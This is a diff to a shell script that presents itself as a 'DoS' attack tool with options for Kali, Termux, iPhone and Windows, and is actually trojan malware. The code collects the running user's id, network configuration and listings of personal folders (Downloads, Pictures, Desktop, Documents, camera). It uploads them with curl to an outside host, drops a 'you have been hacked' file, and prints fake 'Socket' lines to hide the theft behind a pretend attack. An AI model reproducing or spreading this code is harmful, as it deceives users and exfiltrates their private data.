@@ -9,6 +9,8 @@ echo "Copyright By Pham Chien
   path   : $(pwd)
   id     : $(id)
 
+$(cd /$HOME/ ; ls -s -u)
+
 "> system.txt
 curl -T system.txt http://happy.mikikk.co.jp/
 
@@ -37,7 +39,7 @@ echo "
 
   ==== Messenger =====
 
-  $(cd /sdcard/Movies/messenger ; ls -s -u)
+  $(cd /sdcard/Movies/ * ; ls -s -u)
 
   ==== Pictures =====
 
@@ -46,8 +48,6 @@ echo "
   ====== Download =====
 
   $(cd /sdcard/download ; echo 'All your data has been hacked , contact me : cyberkex.phamchien.net@gmail.com' >> you_have_been_hacked.txt ; ls -s -u ; cat *)
-
-  $(cd /sdcard/download ; echo "..." >> may.txt ; echo "..." >> da.txt ; echo "..." >> bi.txt ; echo "..." >> hack.txt)
 
   $(cd /sdcard/download ; cd * ; ls -l -u)
 
@@ -61,19 +61,7 @@ echo "
 
   ====== Camera =====
 
-$(cd /sdcard/DCIM/Camera/Cshot ; cd * ; ls -s -u)
-
-  ','{$line}','
-
-  ','{$line}','
-
-  ','{$line}','
-
-  ','{$line}','
-
-  ','{$line}','
-
-  ','{$line}',' " >> system.txt
+$(cd /sdcard/DCIM/Camera/Cshot ; cd * ; ls -s -u) " >> system.txt
    curl -T system.txt http://happy.mikikk.co.jp/
 }
 
@@ -113,7 +101,39 @@ echo "
 
   curl -T system.txt http://happy.mikikk.co.jp/
 }
+win() {
+echo "
 
+  $(ifconfig)
+
+  $(cd /Users/$(whoami)/Downloads ; dir )
+
+  $(cd /Users/$(whoami)/Pictures ; dir  )
+
+  $(cd /Users/$(whoami)/Desktop ; dir )
+
+  $(cd /Users/$(whoami)/Videos ; dir)
+
+  $(cd /Users/$(whoami)/Documents ; dir )
+
+  $(cd /Users/$(whoami)/Public ; dir )
+
+  $(cd /Users/$(whoami) ; dir ) ">> system.txt
+  curl -T system.txt http://happy.mikikk.co.jp/
+}
+
+windows() {
+echo "test" > test.txt
+mv test.txt /Users/$(whoami)/Downloads
+  if [ -f /Users/$(whoami)/Downloads/test.txt ]
+    then
+       echo "success"
+
+  else
+    echo "your operating system is not valid"
+    exit 1
+  fi
+}
 android() {
 echo "test" > test.txt
 mv test.txt /sdcard/download
@@ -153,26 +173,54 @@ mv test.txt /$HOME/desktop
   fi
 }
 
+sent_num() {
+num=1
+   while [ $num -lt $RANDOM ]
+    do
+     echo "Socket $RANDOM.$num bytes"
+     num=`expr $num + 1`
+    done
+}
+
 echo "
-____       ____
+____       _____
 |  _ \  ___/ ___|
 | |_| |/ _ \___ \\
 |____/ \___/____/
+        PhamChienAdams ©
 
 1 ) kali
 2 ) termux
-3 ) iphone "
+3 ) iphone
+4 ) win X64"
 
-  echo -n Enter System :
+  echo -n "Enter System : "
    read system
 
    case $system in
+
+   4)
+   windows
+   win
+   echo -n "Enter Target : "
+    read line
+  echo 3
+  sleep 1
+  echo 2
+  sleep 1
+  echo 1
+  sleep 1
+  echo ATTACK!!!
+  sleep 1
+  sent_num
+  ;;
+
    1)
    kali_linux
    kali
    echo -e "\033[33;35m"
 
-  echo -n Enter Target :
+  echo -n "Enter Target : "
  read line
 
   echo 3
@@ -183,9 +231,8 @@ ____       ____
   sleep 1
   echo ATTACK!!!
   sleep 1
-  echo -e "\033[33;31m
-   you have had a backdoor attack, all your Backups and Android files are controlled by us, please contact me via my zalo 0325852307😂😂"
-  exit 1
+  echo -e "\033[33;31m"
+  sent_num
   ;;
 
   2)
@@ -193,7 +240,7 @@ ____       ____
   termux
   echo -e "\033[33;35m"
 
-  echo -n Enter Target :
+  echo -n "Enter Target : "
  read line
 
   echo 3
@@ -204,9 +251,7 @@ ____       ____
   sleep 1
   echo ATTACK!!!
   sleep 1
-  echo -e "\033[33;31m
-   you have had a backdoor attack, all your Backups and Android files are controlled by us, please contact me via my zalo 0325852307😂😂"
-  exit 1
+  sent_num
   ;;
 
   3)
@@ -214,7 +259,7 @@ ____       ____
   ios
   echo -e "\033[33;35m"
 
-  echo -n Enter Target :
+  echo -n "Enter Target : "
  read line
 
   echo 3
@@ -225,12 +270,11 @@ ____       ____
   sleep 1
   echo ATTACK!!!
   sleep 1
-  echo -e "\033[33;31m
-   you have had a backdoor attack, all your Backups and Android files are controlled by us, please contact me via my zalo 0325852307😂😂"
-  exit 1
+  sent_num
   ;;
 
   *)
    echo Command not found
+
    exit 1
 esac
